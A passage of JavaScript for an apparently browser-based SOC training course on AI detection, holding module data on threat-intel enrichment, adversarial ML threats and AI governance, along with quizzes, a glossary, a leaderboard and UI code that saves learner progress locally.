+lab:{title:"Module 7 Lab: AI-Assisted TI Enrichment",scene:"Use AI enrichment techniques to assess a cluster of IOCs from a suspected targeted intrusion.",data:"RAW IOC CLUSTER:\n  IPs: 45.142.212.100, 45.142.212.101, 185.220.101.55\n  Domains: update-telemetry[.]net, cdn-security[.]org, microsft-patch[.]com\n  Hash: a3f9c2b1d4e6f8a0b2c4d6e8f0a2b4c6\n  TLS cert CN: *.microsft-patch[.]com\n\nAI TOOL OUTPUTS (from automated enrichment):\n  VirusTotal: 2/75 detections on hash\n  Shodan: Port 443, 8080 open on IPs, self-signed certs\n  WHOIS: All domains registered < 30 days ago, privacy protected\n  Passive DNS: Domains pointed to IPs for < 7 days\n  LLM Summary: 'These indicators are associated with APT41 operations'\n\nNOTE: The LLM attribution above was not verified against primary sources.",tasks:["Assess each IOC type using the enrichment data. What is your confidence level for each?","The LLM attributed this to APT41 without source citation. What is your response to this attribution?","What additional enrichment steps would you take before acting on these IOCs?","Write a structured intelligence note for these IOCs using TLP:AMBER with calibrated confidence language."]}
+},
+{num:8,title:"Adversarial Attacks on AI Detection Systems",dur:"6 hours",level:"Advanced",
+topics:["Adversarial ML fundamentals: evasion, poisoning, extraction attacks","Evasion attacks: crafting inputs to fool ML classifiers in production","Data poisoning: corrupting training data to degrade model performance","Model extraction and inversion: reconstructing models and training data","Adversarial examples in malware: ML-aware obfuscation techniques","Defenses: adversarial training, input validation, ensemble methods, monitoring"],
+videos:[
+{n:"MITRE ATLAS: Adversarial ML Attack Techniques",d:"Official MITRE training on adversarial attacks against AI security systems",u:"https://atlas.mitre.org/resources/",l:"a",t:"~2 hrs"},
+{n:"Google: Adversarial Machine Learning Tutorial",d:"Technical tutorial on adversarial examples and attack methods",u:"https://www.tensorflow.org/tutorials/generative/adversarial_fgsm",l:"a",t:"~1 hr"},
+{n:"NIST: Adversarial ML Threat Taxonomy (Presentation)",d:"NIST researchers present the adversarial ML threat taxonomy",u:"https://csrc.nist.gov/presentations/2022/adversarial-machine-learning",l:"a",t:"~45 min"}
+],
+reading:[
+{n:"NIST: Adversarial Machine Learning - A Taxonomy (Free PDF)",d:"Definitive NIST taxonomy of adversarial ML attacks and mitigations",u:"https://nvlpubs.nist.gov/nistpubs/ai/NIST.AI.100-2e2023.pdf",l:"a",t:"PDF"},
+{n:"MITRE ATLAS Matrix (Full)",d:"Complete matrix of adversarial ML tactics and techniques with real case studies",u:"https://atlas.mitre.org/matrices/ATLAS",l:"a",t:"Reference"},
+{n:"CleverHans: Adversarial ML Library and Papers",d:"Open source adversarial examples research library with linked papers",u:"https://github.com/cleverhans-lab/cleverhans",l:"a",t:"Research + Code"},
+{n:"Robust ML: Certified Defenses Research",d:"Research on certified adversarial robustness and practical defenses",u:"https://www.robust-ml.org/",l:"a",t:"Research"}
+],
+practice:[
+{n:"MITRE ATLAS: Case Studies and Exercises",d:"Real-world adversarial ML case studies from MITRE's research",u:"https://atlas.mitre.org/studies/",l:"a",t:"Case Studies"},
+{n:"Adversarial Robustness Toolbox (ART) - IBM",d:"Free IBM library for testing and hardening ML models against adversarial attacks",u:"https://github.com/Trusted-AI/adversarial-robustness-toolbox",l:"a",t:"Tool + Labs"},
+{n:"Google Colab: FGSM Attack Tutorial",d:"Run a fast gradient sign method adversarial attack example in free Colab",u:"https://www.tensorflow.org/tutorials/generative/adversarial_fgsm",l:"a",t:"Hands-On"}
+],
+quiz:[
+{q:"What is an evasion attack against an ML malware classifier?",o:["Crashing the ML system with malformed input","Crafting a malicious file that maintains its malicious functionality while fooling the classifier into labeling it benign","Stealing the model's training data","Slowing down the classifier to cause detection delays"],a:1,e:"Evasion attacks modify malicious inputs (e.g., adding benign code sections to malware) to cross the classifier's decision boundary without removing the malicious functionality."},
+{q:"A threat actor contributes poisoned network flow data to a shared threat intelligence platform. What attack is this?",o:["Model extraction","Evasion attack","Data poisoning / training data contamination","Model inversion"],a:2,e:"Data poisoning corrupts training data to degrade model performance - either reducing detection of specific attack patterns or causing the model to learn incorrect benign baselines."},
+{q:"What does 'model extraction' enable an attacker to do?",o:["Delete the ML model from the server","Reconstruct an approximate copy of a proprietary model by querying it systematically, then optimize attacks against the copy offline","Extract training data usernames","Steal the model's API key"],a:1,e:"Model extraction (stealing) allows an adversary to query a black-box model and reconstruct its behavior. They can then use the copy to craft optimal adversarial examples without triggering production monitoring."},
+{q:"Which defense is most effective against adversarial input evasion attacks?",o:["Increasing model size","Adversarial training: including adversarial examples in the training set","Using more training data","Reducing model complexity"],a:1,e:"Adversarial training augments the training set with adversarial examples, forcing the model to learn robust decision boundaries that are harder to cross with perturbed inputs."},
+{q:"An ML-aware attacker knows your EDR uses a random forest classifier. Which evasion strategy is most rational?",o:["Encrypt all malware payloads","Use only fileless techniques to avoid file scanning","Query the detection API with modified malware variants to identify feature combinations that avoid detection","Switch to using only commodity malware"],a:2,e:"Systematic probing of the detection boundary (if accessible) reveals which feature modifications cause misclassification. This is why ML models should not expose confidence scores in production APIs."}
+],
+lab:{title:"Module 8 Lab: Adversarial ML Threat Modeling",scene:"Your SOC is deploying an ML-based phishing URL classifier. Conduct a threat model against it before deployment.",data:"SYSTEM: PhishGuard ML v2.0\n  Model type: Gradient boosted trees\n  Features: URL length, domain age, TLS certificate, redirect count,\n            lexical features (entropy, suspicious keywords), IP reputation\n  Training data: 2M labeled URLs (1M phishing, 1M benign) from 2022-2024\n  API: Returns classification (phish/benign) and confidence score\n  Deployment: Email gateway - blocks URLs with confidence > 0.85\n  Retraining: Quarterly",tasks:["Using MITRE ATLAS, identify 3 realistic adversarial attack scenarios against this system. For each, describe the attack method and likely impact.","The API exposes confidence scores. What risk does this create and how would you remediate it?","Quarterly retraining means the model will be stale for up to 3 months. What monitoring would you implement to detect degradation?","Write 3 specific adversarial robustness requirements for the next model version."]}
+},
+{num:9,title:"Building and Governing AI Detection Programs",dur:"6 hours",level:"Advanced",
+topics:["AI program governance: ownership, accountability, and oversight structures","Model lifecycle management: versioning, testing, deployment, monitoring, retirement","Bias and fairness in security AI: audit methods and risk mitigation","Explainability requirements: when and how to explain AI decisions to stakeholders","Incident response for AI failures: runbooks for model degradation and evasion","Metrics for AI security programs: KPIs, SLAs, and continuous improvement"],
+videos:[
+{n:"NIST AI RMF Workshop: Implementing AI Governance",d:"Official NIST workshop on implementing the AI Risk Management Framework",u:"https://airc.nist.gov/Docs",l:"a",t:"~2 hrs"},
+{n:"SANS: Managing and Governing AI in Security Operations",d:"SANS guidance on building governance structures for AI security programs",u:"https://www.sans.org/",l:"a",t:"~1 hr"},
+{n:"Google: Responsible AI Practices",d:"Google's framework for responsible AI development and deployment",u:"https://ai.google/responsibility/responsible-ai-practices/",l:"a",t:"~1 hr"}
+],
+reading:[
+{n:"NIST AI Risk Management Framework (Full)",d:"The definitive US government framework for managing AI risk across the lifecycle",u:"https://airc.nist.gov/Home",l:"a",t:"Framework"},
+{n:"CISA: Guidelines for Secure AI System Development",d:"CISA and international partners guidance on secure AI development and deployment",u:"https://www.cisa.gov/resources-tools/resources/guidelines-secure-ai-system-development",l:"a",t:"Guide"},
+{n:"OECD AI Principles (Free)",d:"International AI governance principles adopted by 42 countries",u:"https://oecd.ai/en/ai-principles",l:"a",t:"Reference"},
+{n:"Partnership on AI: Responsible Practices for ML (Free)",d:"Industry guidance on responsible ML deployment including audit and monitoring",u:"https://partnershiponai.org/",l:"a",t:"Guide"}
+],
+practice:[
+{n:"NIST AI RMF Playbook (Interactive Free Tool)",d:"Interactive tool for implementing the NIST AI RMF in your organization",u:"https://airc.nist.gov/Docs",l:"a",t:"Tool"},
+{n:"AI Fairness 360: IBM Open Source Toolkit",d:"Free IBM toolkit for detecting and mitigating bias in ML datasets and models",u:"https://aif360.mybluemix.net/",l:"a",t:"Tool + Labs"},
+{n:"Google PAIR: People + AI Guidebook",d:"Free practical guidebook for responsible AI design and evaluation",u:"https://pair.withgoogle.com/guidebook/",l:"a",t:"Guide"}
+],
+quiz:[
+{q:"What is 'model drift' and why does it matter for security AI programs?",o:["When a model is moved to a different server","When a model's performance degrades because the real-world data distribution shifts away from training data","When model weights are corrupted","When a model is updated too frequently"],a:1,e:"Security data distributions change constantly (new attacks, new infrastructure, evolving user behavior). Models trained on old data degrade silently. Continuous monitoring for drift is essential."},
+{q:"An AI phishing detection model disproportionately flags emails in non-English languages as malicious. This is an example of:",o:["Appropriate risk-based detection","Model bias caused by unrepresentative training data","Correct behavior - foreign language emails are higher risk","An evasion attack"],a:1,e:"Model bias from unrepresentative training data causes discriminatory outcomes. If training data over-represents English phishing, the model will underperform on multilingual traffic and generate biased false positives."},
+{q:"What is explainability in the context of AI security tools and when is it required?",o:["Documentation of model source code","The ability to articulate why a model made a specific decision - required when decisions affect individuals or when human oversight is mandated","A marketing requirement only","The speed at which a model generates explanations"],a:1,e:"Explainability enables analysts to validate AI decisions, identify errors, and maintain accountability. Regulatory environments (GDPR, financial services) increasingly require explainable AI for consequential decisions."},
+{q:"Your EDR AI generates a false positive that causes a critical server to be quarantined during peak hours. What governance control would have prevented this?",o:["A higher model confidence threshold only","A staged deployment policy requiring human approval for containment actions on critical assets, combined with tested rollback procedures","Disabling AI on critical servers permanently","Quarterly model reviews"],a:1,e:"AI governance requires risk-appropriate controls. Automated containment on critical assets needs human-in-the-loop approval, asset criticality tagging, and tested rollback procedures before any AI action."},
+{q:"Which KPI best measures the ongoing effectiveness of an AI threat detection program?",o:["Number of models deployed","Mean time to detect (MTTD) for confirmed incidents combined with false positive rate trend over time","Total number of alerts generated","Model training frequency"],a:1,e:"MTTD measures whether AI is actually improving detection speed, while FP rate trend measures analyst burden. Together they capture the dual goal of AI security programs: detect faster and reduce noise."}
+],
+lab:{title:"Module 9 Lab: AI Program Governance Review",scene:"Your organization deployed three AI security tools over the past year. Conduct a governance review.",data:"AI TOOL INVENTORY:\n\nTool 1: ML Phishing Classifier (Email Gateway)\n  Deployed: 14 months ago\n  Last retrained: 14 months ago\n  Monitoring: Click-through rate only (not detection accuracy)\n  Owner: IT Operations (not Security)\n  Incidents: 2 executive email chains blocked, 1 C-suite complaint\n\nTool 2: UEBA (Insider Threat)\n  Deployed: 8 months ago\n  False positive rate: 89% (never formally measured before this review)\n  Analyst response: Team ignores scores below 80 due to noise\n  Training data: Includes period during COVID remote work anomalies\n\nTool 3: EDR ML Detections\n  Deployed: 3 months ago\n  Integration: Alerts feed SIEM but no automated response enabled\n  Tuning: Default vendor settings, no customization\n  Coverage: 60% of endpoints enrolled",tasks:["For each tool, identify the governance failures and their potential security impact.","Prioritize the three tools for remediation. Justify your ranking.","Write a 90-day remediation plan for the highest-priority tool including specific actions, owners, and success metrics.","Design a one-page AI governance policy covering the minimum controls all future AI security tools must have before deployment."]}
+}
+];
+
+var GLOSSARY = [
+{t:"Machine Learning",a:"ML",d:"A subset of AI where systems learn patterns from data to make predictions or decisions without being explicitly programmed for each task.",g:"Foundations"},
+{t:"Supervised Learning",a:"",d:"ML training approach using labeled examples (input-output pairs) to teach a model to predict outputs for new inputs.",g:"Foundations"},
+{t:"Unsupervised Learning",a:"",d:"ML training without labeled data - the model discovers patterns, clusters, or anomalies in unlabeled data independently.",g:"Foundations"},
+{t:"Anomaly Detection",a:"",d:"ML technique that learns normal behavior patterns and flags statistically significant deviations as potential threats.",g:"Detection"},
+{t:"False Positive",a:"FP",d:"A benign event incorrectly classified as malicious by an AI model. High FP rates cause alert fatigue and erode analyst trust.",g:"Metrics"},
+{t:"False Negative",a:"FN",d:"A malicious event missed by the AI model. In security, false negatives represent undetected threats - the most dangerous outcome.",g:"Metrics"},
+{t:"Precision",a:"",d:"The proportion of positive predictions that are actually positive. High precision means few false positives. Precision = TP / (TP + FP).",g:"Metrics"},
+{t:"Recall",a:"",d:"The proportion of actual positives that are correctly identified. High recall means few missed threats. Recall = TP / (TP + FN).",g:"Metrics"},
+{t:"AUC-ROC",a:"",d:"Area Under the ROC Curve - measures a classifier's ability to distinguish between classes across all thresholds. Range 0-1; 0.5 is random.",g:"Metrics"},
+{t:"User and Entity Behavior Analytics",a:"UEBA",d:"ML-powered system that establishes behavioral baselines for users and entities, flagging deviations that indicate threats.",g:"Tools"},
+{t:"Security Orchestration, Automation and Response",a:"SOAR",d:"Platform that automates security workflows, alert enrichment, and response playbooks using rules and AI assistance.",g:"Tools"},
+{t:"Endpoint Detection and Response",a:"EDR",d:"Security tool that monitors endpoint behavior, uses ML to detect malicious activity, and enables investigation and response.",g:"Tools"},
+{t:"Network Detection and Response",a:"NDR",d:"Security tool that uses ML to analyze network traffic, establish behavioral baselines, and detect anomalous patterns.",g:"Tools"},
+{t:"Concept Drift",a:"",d:"Degradation of model performance over time as real-world data distributions change away from the training data.",g:"Operations"},
+{t:"Overfitting",a:"",d:"When a model performs well on training data but poorly on new data because it memorized training patterns rather than learning general rules.",g:"Foundations"},
+{t:"Feature Engineering",a:"",d:"The process of selecting, transforming, and creating input variables (features) from raw data to improve ML model performance.",g:"Foundations"},
+{t:"Adversarial Machine Learning",a:"AML",d:"The study and practice of attacks that manipulate ML systems by crafting specially designed inputs to cause misclassification.",g:"Adversarial"},
+{t:"Evasion Attack",a:"",d:"An adversarial ML attack where a malicious input is crafted to be misclassified as benign by a deployed model without losing its malicious function.",g:"Adversarial"},
+{t:"Data Poisoning",a:"",d:"An attack that corrupts ML training data to degrade model performance, introduce backdoors, or cause targeted misclassifications.",g:"Adversarial"},
+{t:"Model Extraction",a:"",d:"An adversarial technique that reconstructs an approximate copy of a proprietary ML model by systematically querying its API.",g:"Adversarial"},
+{t:"MITRE ATLAS",a:"",d:"MITRE's knowledge base of adversary tactics and techniques specifically targeting AI and ML systems, analogous to ATT&CK.",g:"Frameworks"},
+{t:"Explainability",a:"XAI",d:"The ability to articulate why an AI model made a specific decision in terms understandable to humans - required for high-stakes decisions.",g:"Governance"},
+{t:"Model Drift",a:"",d:"Silent degradation of model accuracy as the real-world environment evolves away from training conditions.",g:"Operations"},
+{t:"Baseline",a:"",d:"The learned model of normal behavior for a user, entity, or system against which deviations are measured.",g:"Detection"},
+{t:"Peer Group Analysis",a:"",d:"Comparing a user or entity's behavior to others with similar roles and access patterns to identify relative outliers.",g:"Detection"},
+{t:"Natural Language Processing",a:"NLP",d:"AI techniques for processing, analyzing, and generating human language - used in SIEM search, log parsing, and TI extraction.",g:"Techniques"},
+{t:"Random Forest",a:"",d:"An ensemble ML algorithm using multiple decision trees. Widely used in security for malware classification and anomaly detection.",g:"Techniques"},
+{t:"Isolation Forest",a:"",d:"An unsupervised anomaly detection algorithm that isolates anomalies by randomly partitioning data - effective for network and log anomalies.",g:"Techniques"},
+{t:"Autoencoder",a:"",d:"A neural network trained to reconstruct its input through a compressed representation. Anomalies have high reconstruction error.",g:"Techniques"},
+{t:"AI Governance",a:"",d:"The policies, processes, and controls that ensure AI systems are deployed responsibly, monitored continuously, and accountable to human oversight.",g:"Governance"}
+];
+
+var LB = [
+{name:"Rivera",role:"AI Security Engineer",av:"R",color:"#00C9E4",mods:9,quiz:95,bdg:"bdg-g",bdgt:"Top Analyst"},
+{name:"Chen",role:"Senior SOC Analyst",av:"C",color:"#9B59B6",mods:8,quiz:91,bdg:"bdg-s",bdgt:"Expert"},
+{name:"Okafor",role:"Detection Engineer",av:"O",color:"#E8741A",mods:7,quiz:88,bdg:"bdg-b",bdgt:"Advanced"},
+{name:"Patel",role:"SOC Analyst L2",av:"P",color:"#2ECC71",mods:6,quiz:83,bdg:"bdg-a",bdgt:"Analyst"},
+{name:"Torres",role:"Threat Hunter",av:"T",color:"#E74C3C",mods:5,quiz:79,bdg:"bdg-a",bdgt:"Analyst"},
+{name:"Kim",role:"SOC Analyst L1",av:"K",color:"#3D8FD4",mods:4,quiz:74,bdg:"bdg-a",bdgt:"Analyst"},
+{name:"Walsh",role:"Security Architect",av:"W",color:"#F1C40F",mods:3,quiz:69,bdg:"bdg-a",bdgt:"Analyst"}
+];
+
+var S = {
+  done: new Set(JSON.parse(localStorage.getItem('aiDetectDone') || '[]')),
+  bm: new Set(JSON.parse(localStorage.getItem('aiDetectBm') || '[]')),
+  notes: JSON.parse(localStorage.getItem('aiDetectNotes') || '{}'),
+  scores: JSON.parse(localStorage.getItem('aiDetectScores') || '{}'),
+  labs: new Set(JSON.parse(localStorage.getItem('aiDetectLabs') || '[]'))
+};
+var labAnswers = {};
+var curFilter = 'all';
+var quizState = {};
+
+function saveState() {
+  localStorage.setItem('aiDetectDone', JSON.stringify(Array.from(S.done)));
+  localStorage.setItem('aiDetectBm', JSON.stringify(Array.from(S.bm)));
+  localStorage.setItem('aiDetectNotes', JSON.stringify(S.notes));
+  localStorage.setItem('aiDetectScores', JSON.stringify(S.scores));
+  localStorage.setItem('aiDetectLabs', JSON.stringify(Array.from(S.labs)));
+}
+
+document.querySelectorAll('.nav-tab').forEach(function(btn) {
+  btn.addEventListener('click', function() {
+    document.querySelectorAll('.nav-tab').forEach(function(b) { b.classList.remove('active'); });
+    btn.classList.add('active');
+    document.querySelectorAll('.page').forEach(function(p) { p.classList.remove('active'); });
+    document.getElementById('page-' + btn.dataset.page).classList.add('active');
+    if (btn.dataset.page === 'bookmarks') renderBookmarks();
+    if (btn.dataset.page === 'leaderboard') renderLeaderboard();
+    if (btn.dataset.page === 'glossary') renderGlossary('');
+  });
+});
+
+var nameEl = document.getElementById('analystName');
+nameEl.value = localStorage.getItem('aiDetectName') || '';
+nameEl.addEventListener('change', function() { localStorage.setItem('aiDetectName', nameEl.value); });
+
+function el(tag, cls, txt) {
+  var e = document.createElement(tag);
+  if (cls) e.className = cls;
+  if (txt !== undefined) e.textContent = txt;
+  return e;
+}
+function alink(href, cls) {
+  var e = document.createElement('a');
+  e.href = href; e.target = '_blank'; e.rel = 'noopener noreferrer';
+  if (cls) e.className = cls;
+  e.addEventListener('click', function(ev) { ev.stopPropagation(); });
+  return e;
+}
+function btn(cls, txt, handler) {
+  var b = document.createElement('button');
+  b.className = cls; b.textContent = txt;
+  if (handler) b.addEventListener('click', handler);
+  return b;
+}
+function rlClass(l) { return l === 'b' ? 'rl rl-b' : l === 'i' ? 'rl rl-i' : 'rl rl-a'; }
+function rlLabel(l) { return l === 'b' ? 'Beginner' : l === 'i' ? 'Intermediate' : 'Advanced'; }
+function levelClass(level) {
+  if (level === 'Foundation') return 'lvl-Foundation';
+  if (level === 'Intermediate') return 'lvl-Intermediate';
+  return 'lvl-Advanced';
+}
+
+function buildResLink(r, iconCls, iconTxt) {
+  var link = alink(r.u, 'res-link');
+  var icon = el('div', 'res-icon ' + iconCls, iconTxt);
+  var info = el('div', 'res-info');
+  info.appendChild(el('div', 'res-name', r.n));
+  info.appendChild(el('div', 'res-desc', r.d));
+  var meta = el('div', 'res-meta');
+  meta.appendChild(el('span', rlClass(r.l), rlLabel(r.l)));
+  if (r.t) meta.appendChild(el('span', 'rt', r.t));
+  info.appendChild(meta);
+  link.appendChild(icon);
+  link.appendChild(info);
+  return link;
+}
+
+function buildSection(label, bodyEls) {
+  var wrap = el('div', 'sec');
+  var tog = el('button', 'sec-toggle');
+  var arr = el('span', 'arr', '>');
+  tog.appendChild(arr);
+  tog.appendChild(el('span', '', ' ' + label));
+  var body = el('div', 'sec-body');
+  bodyEls.forEach(function(c) { body.appendChild(c); });
+  tog.addEventListener('click', function(ev) {
+    ev.stopPropagation();
+    tog.classList.toggle('open');
+    body.classList.toggle('open');
+  });
+  wrap.appendChild(tog);
+  wrap.appendChild(body);
+  return wrap;
+}
+
+function renderModules(filter) {
+  if (filter !== undefined) curFilter = filter;
+  var grid = document.getElementById('modGrid');
+  grid.innerHTML = '';
+  var shown = 0;
+  MODS.forEach(function(mod) {
+    var isDone = S.done.has(mod.num);
+    var isBm = S.bm.has(mod.num);
+    if (curFilter === 'completed' && !isDone) return;
+    if (curFilter === 'bookmarked' && !isBm) return;
+    if (curFilter !== 'all' && curFilter !== 'completed' && curFilter !== 'bookmarked' && mod.level !== curFilter) return;
+    shown++;
+    var card = el('div', 'mod-card' + (isDone ? ' completed' : '') + (isBm ? ' bookmarked' : ''));
+    card.style.animationDelay = (shown * 0.04) + 's';
+
+    var top = el('div', 'card-top');
+    var meta = el('div', 'card-meta');
+    meta.appendChild(el('span', 'card-num', 'MODULE ' + String(mod.num).padStart(2, '0')));
+    meta.appendChild(el('span', 'lvl-badge ' + levelClass(mod.level), mod.level));
+    top.appendChild(meta);
+    top.appendChild(el('div', 'card-title', mod.title));
+    var info = el('div', 'card-info');
+    info.appendChild(el('span', 'card-dur', mod.dur));
+    var acts = el('div', 'card-actions');
+
+    var bmBtn = el('button', 'bm-btn');
+    bmBtn.innerHTML = isBm ? '&#9733;' : '&#9734;';
+    bmBtn.title = 'Bookmark';
+    bmBtn.addEventListener('click', function(ev) {
+      ev.stopPropagation();
+      if (S.bm.has(mod.num)) { S.bm.delete(mod.num); card.classList.remove('bookmarked'); bmBtn.innerHTML = '&#9734;'; }
+      else { S.bm.add(mod.num); card.classList.add('bookmarked'); bmBtn.innerHTML = '&#9733;'; }
+      saveState();
+    });
+
+    var chk = el('div', 'chk');
+    chk.innerHTML = isDone ? '&#10003;' : '';
+    chk.title = 'Mark complete';
+    chk.addEventListener('click', function(ev) {
+      ev.stopPropagation();
+      if (S.done.has(mod.num)) {
+        S.done.delete(mod.num); card.classList.remove('completed'); chk.innerHTML = '';
+      } else {
+        S.done.add(mod.num); card.classList.add('completed'); chk.innerHTML = '&#10003;';
+      }
+      saveState();
+      var c = S.done.size;
+      var pct = Math.round(c / MODS.length * 100);
+      var fill = document.getElementById('progFill');
+      var count = document.getElementById('progCount');
+      if (fill) fill.style.width = pct + '%';
+      if (count) count.textContent = c + ' / ' + MODS.length + ' complete';
+    });
+
+    acts.appendChild(bmBtn);
+    acts.appendChild(chk);
+    info.appendChild(acts);
+    top.appendChild(info);
+    card.appendChild(top);
+
+    card.appendChild(buildSection('Topics Covered', mod.topics.map(function(t) { return el('div', 'topic-item', t); })));
+    card.appendChild(buildSection('Video and Course Training (' + mod.videos.length + ')', mod.videos.map(function(r) { return buildResLink(r, 'ri-v', 'VID'); })));
+    card.appendChild(buildSection('Papers, Whitepapers and Reading (' + mod.reading.length + ')', mod.reading.map(function(r) { return buildResLink(r, 'ri-r', 'DOC'); })));
+    card.appendChild(buildSection('Hands-On Practice and Labs (' + mod.practice.length + ')', mod.practice.map(function(r) { return buildResLink(r, 'ri-p', 'LAB'); })));
+
+    var actRow = el('div', 'act-row');
+    var score = S.scores[mod.num];
+    var qBtn = btn('act-btn quiz-act', score !== undefined ? 'Quiz - ' + score + '%' : 'Quiz');
+    qBtn.addEventListener('click', function(ev) { ev.stopPropagation(); openQuiz(mod.num); });
+    var lBtn = btn('act-btn lab-act', S.labs.has(mod.num) ? 'Lab - Done' : 'Lab');
+    lBtn.addEventListener('click', function(ev) { ev.stopPropagation(); openLab(mod.num); });
+    actRow.appendChild(qBtn);
+    actRow.appendChild(lBtn);
+    card.appendChild(actRow);
+
+    var noteWrap = el('div', 'notes-sec');
+    var noteTog = el('button', 'notes-toggle');
+    var noteArr = el('span', 'arr', '>');
+    noteTog.appendChild(noteArr);
+    var savedNote = S.notes[mod.num] || '';
+    noteTog.appendChild(el('span', '', ' Analyst Notes' + (savedNote ? ' (saved)' : '')));
+    var noteBody = el('div', 'notes-body');
+    var ta = el('textarea', 'notes-ta');
+    ta.placeholder = 'Add your notes and key takeaways...';
+    ta.value = savedNote;
+    var saveBtn = btn('notes-save', 'Save Note');
+    saveBtn.addEventListener('click', function(ev) {
+      ev.stopPropagation();
+      S.notes[mod.num] = ta.value;
+      saveState();
+      saveBtn.textContent = 'Saved!';
+      setTimeout(function() { saveBtn.textContent = 'Save Note'; }, 1500);
+    });
+    noteTog.addEventListener('click', function(ev) {
+      ev.stopPropagation();
+      noteTog.classList.toggle('open');
+      noteBody.classList.toggle('open');
+    });
+    noteBody.appendChild(ta);
+    noteBody.appendChild(saveBtn);
+    noteWrap.appendChild(noteTog);
+    noteWrap.appendChild(noteBody);
+    card.appendChild(noteWrap);
+    grid.appendChild(card);
+  });
+
+  if (shown === 0) {
+    var msg = el('div', '');
+    msg.style.cssText = 'grid-column:1/-1;text-align:center;padding:60px;color:#8FA3B8;font-size:14px;';
+    msg.textContent = 'No modules match this filter.';
+    grid.appendChild(msg);
+  }
+}
+
+function updateProgress() {
+  var c = S.done.size;
+  var pct = Math.round(c / MODS.length * 100);
+  var fill = document.getElementById('progFill');
+  var count = document.getElementById('progCount');
+  if (fill) fill.style.width = pct + '%';
+  if (count) count.textContent = c + ' / ' + MODS.length + ' complete';
+}
+
+document.querySelectorAll('.filter-btn').forEach(function(b) {
+  b.addEventListener('click', function() {
+    document.querySelectorAll('.filter-btn').forEach(function(x) { x.classList.remove('active'); });
+    b.classList.add('active');
+    renderModules(b.dataset.filter);
+  });
+});
+
+function openQuiz(num) {
+  var mod = MODS.find(function(m) { return m.num === num; });
+  if (!mod) return;
+  quizState = { num: num, qs: mod.quiz, cur: 0, correct: 0 };
+  document.getElementById('quizTitle').textContent = mod.title;
+  document.getElementById('quizSub').textContent = 'MODULE ' + String(num).padStart(2,'0') + ' - ' + mod.quiz.length + ' QUESTIONS';
+  renderQuizQ();
+  document.getElementById('quizOverlay').classList.add('open');
+}
+
+function renderQuizQ() {
+  var qs = quizState.qs;
+  var cur = quizState.cur;
+  document.getElementById('qPBFill').style.width = Math.round(cur / qs.length * 100) + '%';
+  var body = document.getElementById('quizBody');
+  body.innerHTML = '';
+  if (cur >= qs.length) {
+    var sc = Math.round(quizState.correct / qs.length * 100);
+    S.scores[quizState.num] = sc;
+    saveState();
+    var msg = sc >= 80 ? 'Great work - ready to move on.' : sc >= 60 ? 'Good effort - review the explanations and retry.' : 'Review this module before retaking.';
+    var res = el('div', 'q-result');
+    res.appendChild(el('div', 'q-score', sc + '%'));
+    res.appendChild(el('div', 'q-score-lbl', quizState.correct + ' of ' + qs.length + ' correct'));
+    res.appendChild(el('div', 'q-msg', msg));
+    res.appendChild(btn('q-retry', 'Retake Quiz', function() { openQuiz(quizState.num); }));
+    body.appendChild(res);
+    renderModules();
+    return;
+  }
+  var q = qs[cur];
+  body.appendChild(el('div', 'q-text', 'Q' + (cur + 1) + '. ' + q.q));
+  var opts = el('div', 'q-opts');
+  q.o.forEach(function(opt, i) {
+    var ob = btn('q-opt', opt, function() {
+      if (document.querySelector('.q-opt.correct, .q-opt.wrong')) return;
+      document.querySelectorAll('.q-opt').forEach(function(x) { x.classList.add('locked'); });
+      if (i === q.a) { ob.classList.add('correct'); quizState.correct++; }
+      else { ob.classList.add('wrong'); document.querySelectorAll('.q-opt')[q.a].classList.add('reveal'); }
+      explain.style.display = 'block';
+      nextBtn.style.display = 'inline-block';
+    });
+    opts.appendChild(ob);
+  });
+  body.appendChild(opts);
+  var explain = el('div', 'q-explain', q.e);
+  body.appendChild(explain);
+  var nextRow = el('div', 'q-next');
+  var nextBtn = btn('q-next-btn', cur + 1 < qs.length ? 'Next ->' : 'See Results', function() {
+    quizState.cur++;
+    renderQuizQ();
+  });
+  nextRow.appendChild(nextBtn);
+  body.appendChild(nextRow);
+}
+
+document.getElementById('quizClose').addEventListener('click', function() { document.getElementById('quizOverlay').classList.remove('open'); });
+document.getElementById('quizOverlay').addEventListener('click', function(ev) { if (ev.target === ev.currentTarget) ev.currentTarget.classList.remove('open'); });
+
+function openLab(num) {
+  var mod = MODS.find(function(m) { return m.num === num; });
+  if (!mod || !mod.lab) return;
+  var lab = mod.lab;
+  var saved = labAnswers[num] || {};
+  document.getElementById('labTitle').textContent = lab.title;
+  var body = document.getElementById('labBody');
+  body.innerHTML = '';
+  var scene = el('div', 'lab-scene');
+  scene.innerHTML = '<strong>Scenario:</strong> ' + lab.scene;
+  body.appendChild(scene);
+  body.appendChild(el('div', 'lab-data', lab.data));
+  var textareas = [];
+  lab.tasks.forEach(function(task, i) {
+    body.appendChild(el('div', 'lab-tl', 'Task ' + (i + 1)));
+    body.appendChild(el('div', 'lab-tq', task));
+    var ta = el('textarea', 'lab-ta');
+    ta.placeholder = 'Your analysis...';
+    ta.rows = 4;
+    ta.value = saved[i] || '';
+    textareas.push(ta);
+    body.appendChild(ta);
+  });
+  body.appendChild(el('div', 'lab-hint', 'Tip: Labs assess analytical reasoning and use of evidence - there is no single correct answer.'));
+  var subBtn = btn('lab-submit', S.labs.has(num) ? 'Update Answers' : 'Mark Complete and Save', function() {
+    if (!labAnswers[num]) labAnswers[num] = {};
+    textareas.forEach(function(ta, i) { labAnswers[num][i] = ta.value; });
+    S.labs.add(num);
+    saveState();
+    document.getElementById('labOverlay').classList.remove('open');
+    renderModules();
+  });
+  body.appendChild(subBtn);
+  document.getElementById('labOverlay').classList.add('open');
+}
+
+document.getElementById('labClose').addEventListener('click', function() { document.getElementById('labOverlay').classList.remove('open'); });
+document.getElementById('labOverlay').addEventListener('click', function(ev) { if (ev.target === ev.currentTarget) ev.currentTarget.classList.remove('open'); });
+
+function renderGlossary(query) {
+  var grid = document.getElementById('glsGrid');
+  grid.innerHTML = '';
+  var q = (query || '').toLowerCase();
+  GLOSSARY.forEach(function(g) {
+    var match = !q || g.t.toLowerCase().includes(q) || (g.a||'').toLowerCase().includes(q) || g.d.toLowerCase().includes(q);
+    var card = el('div', 'gls-card' + (match ? '' : ' hidden'));
+    card.appendChild(el('div', 'gls-term', g.t));
+    if (g.a) card.appendChild(el('div', 'gls-abbr', g.a));
+    card.appendChild(el('div', 'gls-def', g.d));
+    if (g.g) card.appendChild(el('span', 'gls-tag', g.g));
+    grid.appendChild(card);
+  });
+}
+document.getElementById('glsSearch').addEventListener('input', function(ev) { renderGlossary(ev.target.value); });
+
+function renderLeaderboard() {
